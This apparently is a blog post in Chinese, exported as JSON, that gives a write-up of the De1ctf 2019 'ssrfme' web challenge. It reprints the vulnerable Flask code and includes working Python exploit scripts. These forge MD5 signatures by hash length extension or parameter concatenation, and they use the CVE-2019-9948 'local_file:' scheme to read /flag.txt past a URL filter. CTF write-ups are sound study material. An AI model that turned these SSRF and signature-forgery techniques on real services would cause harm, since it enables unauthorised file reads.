{"title":"De1ctf","slug":"De1ctf","date":"2019-08-16T12:00:50.000Z","updated":"2019-09-03T14:24:23.083Z","comments":true,"path":"api/articles/De1ctf.json","photos":[],"link":"","excerpt":"这次比赛真的超有意思的！我超级喜欢的！做了半天啥都没做出来，看着那个樱花🌸全程陶醉~","covers":null,"content":"<p>这次比赛真的超有意思的！我超级喜欢的！做了半天啥都没做出来，看着那个樱花🌸全程陶醉~</p>\n<a id=\"more\"></a>\n<h1 id=\"De1ctf-2019-WP\"><a href=\"#De1ctf-2019-WP\" class=\"headerlink\" title=\"De1ctf 2019 WP\"></a>De1ctf 2019 WP</h1><h2 id=\"ssrfme\"><a href=\"#ssrfme\" class=\"headerlink\" title=\"ssrfme\"></a>ssrfme</h2><p>源码 </p>\n<pre><code>#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\nreload(sys)\nsys.setdefaultencoding(&apos;latin1&apos;)\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result[&apos;code&apos;] = 500\n        if (self.checkSign()):\n            if &quot;scan&quot; in self.action:\n                tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)\n                resp = scan(self.param)\n                if (resp == &quot;Connection Timeout&quot;):\n                    result[&apos;data&apos;] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result[&apos;code&apos;] = 200\n            if &quot;read&quot; in self.action:\n                f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)\n                result[&apos;code&apos;] = 200\n                result[&apos;data&apos;] = f.read()\n            if result[&apos;code&apos;] == 500:\n                result[&apos;data&apos;] = &quot;Action Error&quot;\n        else:\n            result[&apos;code&apos;] = 500\n            result[&apos;msg&apos;] = &quot;Sign Error&quot;\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n#generate Sign For Action Scan.\n@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])\ndef geneSign():\n    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))\n    action = &quot;scan&quot;\n    return getSign(action, param)\n\n\n@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(&quot;action&quot;))\n    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))\n    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))\n    ip = request.remote_addr\n    if(waf(param)):\n        return &quot;No Hacker!!!!&quot;\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route(&apos;/&apos;)\ndef index():\n    return open(&quot;code.txt&quot;,&quot;r&quot;).read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return &quot;Connection Timeout&quot;\n\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):\n        return True\n    else:\n        return False\n\n\nif __name__ == &apos;__main__&apos;:\n    app.debug = False\n    app.run(host=&apos;0.0.0.0&apos;,port=80)</code></pre><h3 id=\"源码分析\"><a href=\"#源码分析\" class=\"headerlink\" title=\"源码分析\"></a>源码分析</h3><p><code>Exec()</code>函数首先调用<code>checkSign()</code>进行md5校验，我们可以通过长度扩展攻击绕过。接下来对scan行为进行打开文本文件，调用<code>scan()</code>读取内容，然后将目标文件内容写入文件。对read行为进行刚刚写入文件的读取。</p>\n<pre><code>def Exec(self):\n    result = {}\n    result[&apos;code&apos;] = 500\n    if (self.checkSign()):\n        if &quot;scan&quot; in self.action:\n            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;w&apos;)\n            resp = scan(self.param)\n            if (resp == &quot;Connection Timeout&quot;):\n                result[&apos;data&apos;] = resp\n            else:\n                print resp\n                tmpfile.write(resp)\n                tmpfile.close()\n            result[&apos;code&apos;] = 200\n        if &quot;read&quot; in self.action:\n            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &apos;r&apos;)\n            result[&apos;code&apos;] = 200\n            result[&apos;data&apos;] = f.read()\n        if result[&apos;code&apos;] == 500:\n            result[&apos;data&apos;] = &quot;Action Error&quot;\n    else:\n        result[&apos;code&apos;] = 500\n        result[&apos;msg&apos;] = &quot;Sign Error&quot;\n    return result\n\ndef checkSign(self):\n    if (getSign(self.action, self.param) == self.sign):\n        return True\n    else:\n        return False</code></pre><p><code>/geneSign</code>路由负责生成Sign。同时<code>action</code>被限定为<code>scan</code></p>\n<pre><code>#generate Sign For Action Scan.\n@app.route(&quot;/geneSign&quot;, methods=[&apos;GET&apos;, &apos;POST&apos;])\ndef geneSign():\n    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))\n    action = &quot;scan&quot;\n    return getSign(action, param)</code></pre><p><code>/De1ta</code>路由对请求的<code>param</code>参数进行检查，然后通过对<code>Task</code>类传入相应参数打印<code>Exec()</code>函数的结果</p>\n<pre><code>@app.route(&apos;/De1ta&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(&quot;action&quot;))\n    param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))\n    sign = urllib.unquote(request.cookies.get(&quot;sign&quot;))\n    ip = request.remote_addr\n    if(waf(param)):\n        return &quot;No Hacker!!!!&quot;\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())</code></pre><p><code>scan()</code>函数打开<code>param</code>指向的内容进行读取，这是我们利用<code>ssrf</code>的点。</p>\n<pre><code>def scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return &quot;Connection Timeout&quot;</code></pre><p>getSign()函数对<code>secerty_key,param,action</code>进行md5加密。</p>\n<pre><code>def getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()</code></pre><p>代码的逻辑大体上是</p>\n<pre><code>初始化各个参数-&gt;进入Task类-&gt;执行Exec()函数-&gt;检查md5值-&gt;对参数中的action进行不同操作-&gt;dump函数执行结果</code></pre><p>我们可以通过长度扩展攻击绕过长度判断，根据提示flag在<code>/flag.txt</code>，我们可以读取这个文件，但是<code>waf()</code>对<code>gopher</code>和<code>file</code>进行过滤，我们无法利用这两个协议，根据CVE-2019-9948(urllib)<a href=\"https://www.cvedetails.com/cve/CVE-2019-9948/\" title=\"CVE-2019-9948\" target=\"_blank\" rel=\"noopener\">https://www.cvedetails.com/cve/CVE-2019-9948/</a>我们可以通过<code>local_file:///flag.txt</code>来绕过waf。</p>\n<h3 id=\"编写脚本\"><a href=\"#编写脚本\" class=\"headerlink\" title=\"编写脚本\"></a>编写脚本</h3><pre><code>import urllib,hashpumpy \nimport requests\n\n&quot;&quot;&quot;\n    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)\n\n    Arguments:\n        hexdigest(str):      Hex-encoded result of hashing key + original_data.\n        original_data(str):  Known data used to get the hash result hexdigest.\n        data_to_add(str):    Data to append\n        key_length(int):     Length of unknown data prepended to the hash\n\n    Returns:\n        A tuple containing the new hex digest and the new message.\n\n&quot;&quot;&quot;\n\nurl = &quot;http://139.180.128.86/&quot;\n\n#get the Sign of Scan\ngeneSign = &quot;geneSign?&quot;\npayload = &quot;local_file:flag.txt&quot;\nre = requests.get(url+geneSign+&quot;param=&quot;+payload).text\nprint re\n\n#hash extend attack\nhashs,hashextend = hashpumpy.hashpump(re,payload+&quot;scan&quot;,&quot;read&quot;,16)\nprint hashs\naction = &quot;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%008%01%00%00%00%00%00%00read&quot;\ncookie = {\n    #&quot;action&quot;:urllib.quote(hashextend),\n    &quot;action&quot;:action,    \n    &quot;sign&quot;:hashs\n}\nprint cookie\n\n\nre2 = requests.get(url+&apos;De1ta?&apos;+&quot;param=&quot;+payload,cookies=cookie)\n\nprint re2.content</code></pre><p>在使用扩展攻击的时候我们需要把所得签名前面的信息去掉</p>\n<pre><code>Input Signature: 785f9921864e8704e5e44e15c8f3d6ce\nInput Data: local_file:flag.txtscan\nInput Key Length: 16\nInput Data to Add: read\n636d649a50e61e75436cc1ba50d5a003\nlocal_file:flag.txtscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x008\\x01\\x00\\x00\\x00\\x00\\x00\\x00read</code></pre><h3 id=\"another-way\"><a href=\"#another-way\" class=\"headerlink\" title=\"another way\"></a>another way</h3><p>在ctf time上看到的回答，分析的好细致<a href=\"https://ctftime.org/writeup/16070\" target=\"_blank\" rel=\"noopener\">https://ctftime.org/writeup/16070</a>。这里提供了另一种思路</p>\n<blockquote>\n<p>This will allow us to read the flag into a file, but we will not be able to read it without a valid sign with the action including “read”. If we can generate a sign for the action as “readscan”, we can perform the scan and read the result in one go.</p>\n<p>Notice, geneSign() will perform an md5 hash of secret + param + action so we can pass the value of param as “flag.txtread” (the value of action will be “scan”) and generate the same hash as if we pass param as “flag.txt” and action as “readscan”.</p>\n<p>“flag.txtread”+”scan” == “flag.txt”+”readscan”</p>\n<p>You could also use a length extension attack, but this way is more simple.</p>\n<p>So our exploit is complete.</p>\n</blockquote>\n<p>这是他们编写的脚本：膜</p>\n<pre><code>import requests\n\ndef geneSign(param):\n    return requests.get(&quot;http://139.180.128.86/geneSign?param=&quot;+param).text\n\nrealParam = &quot;flag.txt&quot;\n\nparam = realParam+&quot;read&quot;\nsign = geneSign(param)\nparam = realParam\n\naction = &quot;readscan&quot;\n\nanswer = requests.get(&quot;http://139.180.128.86/De1ta?param=&quot;+param, cookies={&quot;action&quot;:action,&quot;sign&quot;:sign}).text\n\nprint(answer)</code></pre>","categories":[{"name":"wp","slug":"wp","count":2,"path":"api/categories/wp.json"}],"tags":[{"name":"ssrf","slug":"ssrf","count":3,"path":"api/tags/ssrf.json"},{"name":"RSA","slug":"RSA","count":4,"path":"api/tags/RSA.json"}]}